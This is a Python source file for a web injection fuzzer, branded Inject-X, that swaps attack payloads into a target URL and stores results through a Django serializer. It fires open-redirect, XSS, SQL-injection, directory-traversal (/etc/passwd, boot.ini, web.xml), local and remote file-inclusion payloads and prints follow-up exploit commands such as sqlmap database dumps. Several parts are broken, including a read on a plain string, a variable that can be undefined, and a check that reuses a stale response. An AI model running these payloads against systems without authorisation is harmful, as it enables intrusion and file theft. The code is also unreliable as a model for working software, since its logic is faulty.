from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse
from socket import timeout
import asyncio, csv, json
from aiohttp import ClientSession
from ..serializers import ReportsSerializer

OKBLUE = "\033[94m"
OKRED = "\033[91m"
OKGREEN = "\033[92m"
OKORANGE = "\033[93m"
COLOR1 = "\033[95m"
COLOR2 = "\033[96m"
COLOR3 = "\033[90m"
RESET = "\x1b[0m"
VERBOSE = "1"


def logo():
    print(OKORANGE + "    ____    _       __ _  __" + RESET)
    print(OKORANGE + "   /  _/___  (_)__  _____/ /| |/ /" + RESET)
    print(OKORANGE + "   / // __ \  / / _ \/ ___/ __/   / " + RESET)
    print(OKORANGE + "   _/ // / / / / /  __/ /__/ /_/   |  " + RESET)
    print(OKORANGE + "  /___/_/ /_/_/ /\___/\___/\__/_/|_|  " + RESET)
    print(OKORANGE + "     /_____/           " + RESET)
    print("")
    print(OKGREEN + "--== Inject-X Fuzzer by @xer0dayz ==-- " + RESET)
    print(OKGREEN + "   --== https://xerosecurity.com ==-- " + RESET)
    print("")


async def active_scan(
    session,
    full_url,
    base_url,
    http_length_base,
    payload,
    verbose="y",
    csvWriter=None,
    jsonFile=None,
):
    json_list = []
    verbose = "y"
    new_url = base_url

    # Open Redirect 1 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("google.com")

    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        print(type(http_length))
        print(type(http_length_base))
        print(http_length_base)
        http_length_diff = str(http_length_base - http_length)
        json_list.append(json.dumps(dict(redirect_res.headers)))

        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + redirect_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s -I '"
                + redirect_url
                + "' | egrep location --color=auto"
            )
            result_string = "vulnerable"

        csvLine = ["Open Redirect", redirect_res.status, redirect_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    # Open Redirect 2 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("//google.com")

    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        http_length_diff = str(http_length_base - http_length)
        json_list.append(json.dumps(dict(redirect_res.headers)))

        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + redirect_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s -I '"
                + redirect_url
                + "' | egrep location --color=auto"
            )
            result_string = "vulnerable"

        csvLine = ["Open Redirect", redirect_res.status, redirect_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    # Open Redirect 3 ######################################################################################
    result_string = "benign"
    redirect_exploit = urllib.parse.quote("https://google.com")

    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET)

    redirect_url = new_url.replace("INJECTX", redirect_exploit)

    async with session.get(redirect_url) as redirect_res:
        http_response = str(await redirect_res.read())
        http_length = len(http_response)
        http_status = redirect_res.status
        http_length_diff = str(http_length_base - http_length)
        json_list.append(json.dumps(dict(redirect_res.headers)))

        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + redirect_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "<title>Google</title>" in http_response:
            print(OKRED + "[+] Open Redirect Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s -I '"
                + redirect_url
                + "' | egrep location --color=auto"
            )
            result_string = "vulnerable"

        csvLine = ["Open Redirect", redirect_res.status, redirect_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    # XSS ######################################################################################
    result_string = "benign"
    res_xss = await session.get(new_url)
    try:
        if verbose == "y":
            print(COLOR2 + "[i] Trying Payload: " + str(payload) + RESET)

        # http_request = urllib.request.urlopen(new_url)
        http_response = str(await res_xss.read())
        http_length = len(http_response)
        http_status = res_xss.status
        http_length_diff = str(http_length_base - http_length)
        json_list.append(json.dumps(dict(res_xss.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + new_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        # CHECK FOR REFLECTED VALUE
        if payload in http_response:
            print(OKGREEN + "[+] Reflected Value Detected! " + RESET)

            # IF REFLECTED, TRY HEURISTIC STRING
            payload_exploit_unencoded = "</INJECTX>(1)"
            payload_exploit = "%22%3E%3C%2FINJECTX%3E%281%29"
            xss_url = new_url.replace("INJECTX", payload_exploit)

            res_reflect = await session.get(xss_url)
            try:
                # http_request = urllib.request.urlopen(xss_url)
                http_response = str(await res_reflect.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = res_reflect.status
                json_list.append(json.dumps(dict(res_reflect.headers)))
                if verbose == "y":
                    print(
                        COLOR2
                        + "[i] New URL: "
                        + xss_url
                        + " ["
                        + OKRED
                        + str(http_status)
                        + COLOR2
                        + "]"
                        + " ["
                        + COLOR3
                        + str(http_length)
                        + COLOR2
                        + "]"
                        + " ["
                        + COLOR1
                        + http_length_diff
                        + COLOR2
                        + "]"
                        + RESET
                    )

            except:
                pass

            # CONTINUE TO XSS EXPLOITATION
            if payload_exploit_unencoded in http_response:
                payload_exploit2 = urllib.parse.quote('"><iframe/onload=alert(1)>')
                xss_url2 = new_url.replace("INJECTX", payload_exploit2)
                result_string = "vulnerable"
                csvLine = ["XSS", res_xss.status, xss_url, result_string]
                csvWriter.writerow(csvLine)
                data = json.dumps(csvLine)
                serializer = ReportsSerializer(data=data)
                serializer.save()

                res_reflect = await session.get(xss_url2)
                try:
                    # http_request = urllib.request.urlospen(xss_url2)
                    http_response = str(await res_reflect.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = res_reflect.status
                    json_list.append(json.dumps(dict(res_reflect.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + xss_url2
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    print(OKRED + "[+] XSS Found! ", str(payload_exploit2) + RESET)
                    print(OKRED + "[+] Vulnerable URL: " + xss_url2 + RESET)
                    print(
                        OKGREEN + "[c] Exploit Command: firefox '" + xss_url2 + "' & "
                    )
                    os.system(
                        "curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto"
                    )
                    result_string = "vulnerable"

                    csvLine = ["XSS", res_xss.status, xss_url2, result_string]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()
                    # os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
                except:
                    pass
        else:
            csvLine = ["XSS", res_xss.status, xss_url2, result_string]
            csvWriter.writerow(csvLine)
            data = json.dumps(csvLine)
            serializer = ReportsSerializer(data=data)
            serializer.save()
    except:
        pass

    # SQLi ######################################################################################
    result_string = "benign"
    sqli_exploit = "'"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)

    sqli_url = new_url.replace("INJECTX", sqli_exploit)

    res_sql = await session.get(sqli_url)
    try:
        # http_request = urllib.request.urlopen(sqli_url)
        http_response = str(await res_sql.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_sql.status
        json_list.append(json.dumps(dict(res_sql.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + sqli_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKRED + "[+] SQL Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
            result_string = "vulnerable"

        csvLine = ["SQL Injection", res_sql.status, sqli_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()
        # os.system(sqlmap_command)

    except:
        pass

    # SQLi 2 ######################################################################################
    result_string = "benign"
    sqli_exploit = "\\"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET)

    sqli_url = new_url.replace("INJECTX", sqli_exploit)

    res_sql = await session.get(sqli_url)
    try:
        # http_request = urllib.request.urlopen(sqli_url)
        http_response = str(await res_sql.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_sql.status
        json_list.append(json.dumps(dict(res_sql.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + sqli_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKRED + "[+] SQL Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
            result_string = "vulnerable"

        csvLine = ["SQL Injection", res_sql.status, sqli_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()
        # os.system(sqlmap_command)

    except:
        pass

    # Windows Directory Traversal ######################################################################################
    result_string = "benign"
    traversal_exploit = "/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

    traversal_url = new_url.replace("INJECTX", traversal_exploit)

    res_direc_traversal = await session.get(traversal_url)
    try:

        # http_request = urllib.request.urlopen(traversal_url)
        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status
        json_list.append(json.dumps(dict(res_direc_traversal.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep Windows --color=auto"
            )
            result_string = "vulnerable"

        csvLine = [
            "Windows Directory Traversal",
            res_direc_traversal.status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # Windows Directory Traversal 2 ######################################################################################
    result_string = "benign"
    traversal_exploit = (
        "/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00"
    )
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

    traversal_url = new_url.replace("INJECTX", traversal_exploit)

    res_direc_traversal = await session.get(traversal_url)
    try:

        # http_request = urllib.request.urlopen(traversal_url)
        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status
        json_list.append(json.dumps(dict(res_direc_traversal.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep Windows --color=auto"
            )
            result_string = "vulnerable"

        csvLine = [
            "Windows Directory Traversal",
            res_direc_traversal.status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # Windows Directory Traversal 3 ######################################################################################
    result_string = "benign"
    traversal_exploit = "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

    traversal_url = new_url.replace("INJECTX", traversal_exploit)

    res_direc_traversal = await session.get(traversal_url)
    try:
        # http_request = urllib.request.urlopen(traversal_url)
        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status
        json_list.append(json.dumps(dict(res_direc_traversal.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if (
            "boot loader" in http_response
            or "16-bit" in http_response
            or "16-bit" in http_response
        ):
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep Windows --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = [
            "Windows Directory Traversal",
            res_direc_traversal.status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # Windows Directory Traversal 4 ######################################################################################
    result_string = "benign"
    traversal_exploit = "..%2fWEB-INF%2fweb.xml"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

    traversal_url = new_url.replace("INJECTX", traversal_exploit)

    try:

        # http_request = urllib.request.urlopen(traversal_url)
        http_response = str(await res_direc_traversal.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_direc_traversal.status
        json_list.append(json.dumps(dict(res_direc_traversal.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "<web-app" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep Windows --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = [
            "Windows Directory Traversal",
            res_direc_traversal.status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # Linux Directory Traversal ######################################################################################
    result_string = "benign"
    try:
        traversal_exploit = (
            "/../../../../../../../../../../../../../../../../../etc/passwd"
        )
        if verbose == "y":
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        json_list.append(json.dumps(dict(http_request.getheaders())))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep root --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = [
            "Linux Directory Traversal",
            http_status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # Linux Directory Traversal 2 ######################################################################################
    result_string = "benign"
    try:
        traversal_exploit = (
            "/../../../../../../../../../../../../../../../../../etc/passwd%00"
        )
        if verbose == "y":
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)

        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        json_list.append(json.dumps(dict(http_request.getheaders())))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + traversal_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + traversal_url
                + "' | egrep root --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = [
            "Linux Directory Traversal",
            http_status,
            traversal_url,
            result_string,
        ]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # LFI Check ######################################################################################
    result_string = "benign"
    rfi_exploit = "/etc/passwd"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 'root:' --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["LFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # LFI Check 2 ######################################################################################
    result_string = "benign"
    rfi_exploit = "/etc/passwd%00"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await rfi_url.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 'root:' --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["LFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # LFI Check 3 ######################################################################################
    result_string = "benign"
    rfi_exploit = "C:\\boot.ini"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Windows Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 'root:' --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["LFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # LFI Check 4 ######################################################################################
    result_string = "benign"
    rfi_exploit = "C:\\boot.ini%00"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKRED + "[+] Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 'root:' --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["LFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RFI Check ######################################################################################
    result_string = "benign"
    rfi_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto"
            )
            result_string = "vulnerable"

        csvLine = ["RFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RFI Check 2 ######################################################################################
    result_string = "benign"
    rfi_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt%00"
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET)

    rfi_url = new_url.replace("INJECTX", rfi_exploit)

    res_rfi = await session.get(rfi_url)
    try:

        # http_request = urllib.request.urlopen(rfi_url)
        http_response = str(await res_rfi.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rfi.status
        json_list.append(json.dumps(dict(res_rfi.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rfi_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rfi_url
                + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto"
            )
            result_string = "vulnerable"

        csvLine = ["RFI Check", http_status, rfi_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # IDOR Check ######################################################################################
    # idor_list = [1,2,3]
    # idor_length_list = []
    # for idor in idor_list:
    #  try:
    #    idor_exploit = str(idor)
    #    # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
    #    idor_url = new_url.replace("INJECTX", idor_exploit)
    #    http_request = urllib.request.urlopen(idor_url)
    #    http_response = http_request.read()
    #    http_length = len(http_response)
    #    http_status = http_request.getcode()
    #    idor_length_list.append(http_length)
    #    http_length_diff = str(http_length_base - http_length)
    #    #print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)
    #
    #    if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
    #      print(OKRED + "[+] Possible IDOR Found! " + RESET)
    #      print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
